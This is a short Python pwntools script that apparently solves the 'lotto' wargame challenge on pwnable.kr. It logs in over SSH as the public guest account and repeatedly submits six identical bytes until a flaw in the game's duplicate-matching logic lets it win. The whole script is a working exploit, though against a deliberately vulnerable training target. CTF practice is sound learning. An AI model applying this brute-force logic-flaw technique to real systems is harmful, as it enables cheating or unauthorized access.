from pwn import *

# connect
shell = ssh("lotto", "pwnable.kr", 2222, "guest")
proc = shell.process(["./lotto"])

# start lotto
while True:
    # select menu
    print proc.recv()
    proc.sendline("1")

    # input lotto number
    print proc.recv()
    proc.sendline("\x01"*6)

    print proc.recvline()
    readline = proc.recvline()
    if readline.find("bad") < 0:
        print readline
        break

# disconnect
proc.close()
shell.close()
